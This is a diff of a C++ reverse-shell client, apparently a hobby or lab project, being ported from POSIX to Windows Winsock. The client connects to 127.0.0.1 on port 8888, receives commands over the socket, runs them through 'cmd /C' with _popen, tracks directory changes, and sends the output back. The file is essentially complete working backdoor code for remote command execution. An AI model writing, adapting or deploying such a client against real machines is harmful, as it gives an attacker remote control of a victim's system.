@@ -1,18 +1,23 @@
 #include <iostream>
 #include <thread>
 #include <cstring>
-#include <sys/socket.h>
-#include <arpa/inet.h>
-#include <unistd.h>
+#include <map>
 #include <memory>
 #include <filesystem>
 
-std::string currentDirectory = std::filesystem::current_path();  // track current directory
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#pragma comment(lib, "Ws2_32.lib")
 
+std::string currentDirectory = std::filesystem::current_path().string();
+
+// Execute command from current directory
 std::string exec(const std::string& cmd) {
-    std::string fullCmd = "cd \"" + currentDirectory + "\" && " + cmd;
-    std::shared_ptr<FILE> pipe(popen(fullCmd.c_str(), "r"), pclose);
+    // cd /d ensures we switch drives as well (Windows behavior)
+    std::string fullCmd = "cmd /C cd /d \"" + currentDirectory + "\" && " + cmd;
+    std::shared_ptr<FILE> pipe(_popen(fullCmd.c_str(), "r"), _pclose);
     if (!pipe) return "ERROR\n";
+
     char buffer[128];
     std::string result;
     while (fgets(buffer, sizeof(buffer), pipe.get()) != NULL) {
@@ -21,7 +26,8 @@ std::string exec(const std::string& cmd) {
     return result;
 }
 
-void receive_loop(int clientfd) {
+// Receives and handles commands
+void receive_loop(SOCKET clientfd) {
     char buffer[1024];
     while (true) {
         int bytes = recv(clientfd, buffer, sizeof(buffer) - 1, 0);
@@ -33,23 +39,21 @@ void receive_loop(int clientfd) {
         std::string command(buffer);
         std::string output;
 
-        // Handle 'cd' command manually
         if (command.substr(0, 3) == "cd ") {
             std::string path = command.substr(3);
             std::filesystem::path newPath = std::filesystem::weakly_canonical(std::filesystem::path(currentDirectory) / path);
             if (std::filesystem::exists(newPath) && std::filesystem::is_directory(newPath)) {
-                currentDirectory = newPath;
+                currentDirectory = newPath.string();
                 output = "Changed directory to: " + currentDirectory + "\n";
             } else {
                 output = "Directory not found: " + path + "\n";
             }
         } else {
-            // Execute other commands from the current directory
             output = exec(command);
         }
 
-        if (output == ""){
-            output += "\033[32mExecuted successfully \033[37m\n";
+        if (output.empty()) {
+            output = "[✔] Executed successfully\n";
         }
 
         if (send(clientfd, output.c_str(), output.length(), 0) < 0) {
@@ -60,25 +64,43 @@ void receive_loop(int clientfd) {
 }
 
 int main() {
-    const char *errMsg = "Connection failed\n";
-    int clientfd = socket(AF_INET, SOCK_STREAM, 0);
-    if (clientfd < 0) {
+    // Initialize Winsock
+    WSADATA wsaData;
+    int wsaerr = WSAStartup(MAKEWORD(2, 2), &wsaData);
+    if (wsaerr != 0) {
+        std::cerr << "WSAStartup failed with error: " << wsaerr << "\n";
         return -1;
     }
 
+    SOCKET clientfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (clientfd == INVALID_SOCKET) {
+        std::cerr << "Socket creation failed\n";
+        WSACleanup();
+        return -1;
+    }
 
     sockaddr_in serverAddress{};
     serverAddress.sin_family = AF_INET;
     serverAddress.sin_port = htons(8888);
-    inet_pton(AF_INET, "127.0.0.1", &serverAddress.sin_addr);
 
-    if (connect(clientfd, (sockaddr *)&serverAddress, sizeof(serverAddress)) < 0) {
-        send(clientfd, errMsg, strlen(errMsg), 0);
+    if (inet_pton(AF_INET, "127.0.0.1", &serverAddress.sin_addr) <= 0) {
+        std::cerr << "Invalid address\n";
+        closesocket(clientfd);
+        WSACleanup();
         return -1;
     }
 
+    if (connect(clientfd, (sockaddr*)&serverAddress, sizeof(serverAddress)) < 0) {
+        std::cerr << "Connection failed\n";
+        closesocket(clientfd);
+        WSACleanup();
+        return -1;
+    }
+
+    std::cout << "[+] Connected to server\n";
     receive_loop(clientfd);
 
-    close(clientfd);
+    closesocket(clientfd);
+    WSACleanup();
     return 0;
 }
